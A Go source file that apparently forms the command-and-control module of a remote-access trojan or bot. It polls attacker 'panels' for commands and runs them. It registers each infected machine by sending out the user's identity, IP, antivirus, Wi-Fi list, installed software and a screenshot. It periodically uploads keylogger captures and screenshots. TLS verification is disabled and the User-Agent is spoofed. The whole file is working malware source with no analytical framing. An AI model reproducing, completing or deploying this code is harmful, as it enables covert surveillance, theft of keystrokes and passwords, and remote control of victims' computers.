//for each httpPanel in httpPanels try to send request, if errors try next, if all error sleep and try again later
// Handle SSL/TLS
package components

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"
)

func checkCommand() {
	if useSSL {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
		}
		client := &http.Client{Transport: tr}
		for {
			time.Sleep(time.Duration(randInt(checkEveryMin, checkEveryMax)) * time.Second)
			for i := 0; i < len(httpPanels); i++ {

				req, _ := http.NewRequest("GET", httpPanels[i]+"command", nil)
				req.Header.Set("User-Agent", userAgentKey)
				q := req.URL.Query()
				q.Add("0", myUID)
				if didlastCommand {
					q.Add("1", "Completed!")
				} else {
					q.Add("1", "Not Completed...")
				}
				req.URL.RawQuery = q.Encode()
				//fmt.Println(req.URL.String())
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				defer resp.Body.Close()
				resp_body, _ := ioutil.ReadAll(resp.Body)
				if resp.StatusCode == 200 {
					if len(string(resp_body)) > 2 {
						if string(resp_body) == "spin" {
							registerBot()
							break
						} else {
							go commandParce(string(resp_body))
							break
						}
					}
				}
			}
		}
	} else {
		client := &http.Client{}
		for {
			time.Sleep(time.Duration(randInt(checkEveryMin, checkEveryMax)) * time.Second)
			fmt.Println("Check CMD")
			for i := 0; i < len(httpPanels); i++ {
				req, _ := http.NewRequest("GET", httpPanels[i]+"command", nil)
				req.Header.Set("User-Agent", userAgentKey)
				q := req.URL.Query()
				q.Add("0", myUID)
				if didlastCommand {
					q.Add("1", "Completed!")
				} else {
					q.Add("1", "Not Completed...")
				}
				req.URL.RawQuery = q.Encode()
				//fmt.Println(req.URL.String())
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				defer resp.Body.Close()
				resp_body, _ := ioutil.ReadAll(resp.Body)
				if resp.StatusCode == 200 {
					if len(string(resp_body)) > 2 {
						if string(resp_body) == "spin" {
							registerBot()
							break
						} else {
							go commandParce(string(resp_body))
							break
						}
					}
				}
			}
		}
	}
}

func registerBot() {
	if useSSL {
		bty, _ := captureScreen(true)
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
		}
		client := &http.Client{Transport: tr}
		for i := 0; i < len(httpPanels); i++ {
			data := url.Values{}
			data.Set("0", myUID)
			data.Add("1", myIP)
			data.Add("2", getWhoami())
			data.Add("3", getOS())
			data.Add("4", getInstallDate())
			data.Add("5", checkisAdmin())
			data.Add("6", getAntiVirus())
			data.Add("7", getCPU())
			data.Add("8", getGPU())
			data.Add("9", clientVersion)
			data.Add("10", base64Encode(getSysInfo()))
			data.Add("11", base64Encode(getWifiList()))
			data.Add("12", base64Encode(getIPConfig()))
			data.Add("13", base64Encode(getInstalledSoftware()))
			data.Add("14", base64Encode(string(bty)))
			u, _ := url.ParseRequestURI(httpPanels[i] + "new")
			urlStr := fmt.Sprintf("%v", u)
			r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
			r.Header.Set("User-Agent", userAgentKey)
			r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
			resp, err := client.Do(r)
			if err != nil {
				continue
			} else {
				if resp.StatusCode == 200 {
					break
				}
			}
		}
	} else {
		bty, _ := captureScreen(true)
		client := &http.Client{}
		for i := 0; i < len(httpPanels); i++ {
			data := url.Values{}
			data.Set("0", myUID)
			data.Add("1", myIP)
			data.Add("2", getWhoami())
			data.Add("3", getOS())
			data.Add("4", getInstallDate())
			data.Add("5", checkisAdmin())
			data.Add("6", getAntiVirus())
			data.Add("7", getCPU())
			data.Add("8", getGPU())
			data.Add("9", clientVersion)
			data.Add("10", base64Encode(getSysInfo()))
			data.Add("11", base64Encode(getWifiList()))
			data.Add("12", base64Encode(getIPConfig()))
			data.Add("13", base64Encode(getInstalledSoftware()))
			data.Add("14", base64Encode(string(bty)))
			u, _ := url.ParseRequestURI(httpPanels[i] + "new")
			urlStr := fmt.Sprintf("%v", u)
			r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
			r.Header.Set("User-Agent", userAgentKey)
			r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
			resp, err := client.Do(r)
			if err != nil {
				continue
			} else {
				if resp.StatusCode == 200 {
					break
				}
			}
		}
	}
}

func sendKeylog() {
	for isKeyLogging {
		if tmpKeylog != "" {
			time.Sleep(time.Duration(autoKeyloggerInterval) * time.Minute)
			if useSSL {
				tr := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
				}
				client := &http.Client{Transport: tr}

				for i := 0; i < len(httpPanels); i++ {
					data := url.Values{}
					data.Set("0", myUID)
					data.Add("1", base64Encode(tmpKeylog))
					u, _ := url.ParseRequestURI(httpPanels[i] + "key")
					urlStr := fmt.Sprintf("%v", u)
					r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
					r.Header.Set("User-Agent", userAgentKey)
					r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, err := client.Do(r)
					if err != nil {
						continue
					} else {
						defer resp.Body.Close()
						resp_body, _ := ioutil.ReadAll(resp.Body)
						if resp.StatusCode == 200 {
							if len(string(resp_body)) > 2 {
								if string(resp_body) == "spin" {
									registerBot()
									break
								} else {
									tmpKeylog = "" //Make sure to clear the old logs from memory
									break
								}
							}
						}
					}
				}
			} else {
				client := &http.Client{}

				for i := 0; i < len(httpPanels); i++ {
					data := url.Values{}
					data.Set("0", myUID)
					data.Add("1", base64Encode(tmpKeylog))
					u, _ := url.ParseRequestURI(httpPanels[i] + "key")
					urlStr := fmt.Sprintf("%v", u)
					r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
					r.Header.Set("User-Agent", userAgentKey)
					r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, err := client.Do(r)
					if err != nil {
						continue
					} else {
						defer resp.Body.Close()
						resp_body, _ := ioutil.ReadAll(resp.Body)
						if resp.StatusCode == 200 {
							if len(string(resp_body)) > 2 {
								if string(resp_body) == "spin" {
									registerBot()
									break
								} else {
									tmpKeylog = "" //Make sure to clear the old logs from memory
									break
								}
							}
						}
					}
				}
			}
		}
	}
}

func sendScreenshot() {
	for autoScreenShot {
		time.Sleep(time.Duration(autoScreenShotInterval) * time.Minute)
		if useSSL {
			bty, _ := captureScreen(true)
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
			}
			client := &http.Client{Transport: tr}

			for i := 0; i < len(httpPanels); i++ {
				data := url.Values{}
				data.Set("0", myUID)
				data.Add("1", base64Encode(string(bty)))
				u, _ := url.ParseRequestURI(httpPanels[i] + "ss")
				urlStr := fmt.Sprintf("%v", u)
				r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
				r.Header.Set("User-Agent", userAgentKey)
				r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				resp, err := client.Do(r)
				if err != nil {
					continue
				} else {
					defer resp.Body.Close()
					resp_body, _ := ioutil.ReadAll(resp.Body)
					if resp.StatusCode == 200 {
						if len(string(resp_body)) > 2 {
							if string(resp_body) == "spin" {
								registerBot()
								break
							} else {
								break
							}
						}
					}
				}
			}
		} else {
			bty, _ := captureScreen(true)

			client := &http.Client{}

			for i := 0; i < len(httpPanels); i++ {
				data := url.Values{}
				data.Set("0", myUID)
				data.Add("1", base64Encode(string(bty)))
				u, _ := url.ParseRequestURI(httpPanels[i] + "ss")
				urlStr := fmt.Sprintf("%v", u)
				r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
				r.Header.Set("User-Agent", userAgentKey)
				r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				resp, err := client.Do(r)
				if err != nil {
					continue
				} else {
					defer resp.Body.Close()
					resp_body, _ := ioutil.ReadAll(resp.Body)
					if resp.StatusCode == 200 {
						if len(string(resp_body)) > 2 {
							if string(resp_body) == "spin" {
								registerBot()
								break
							} else {
								break
							}
						}
					}
				}
			}
		}
	}
}
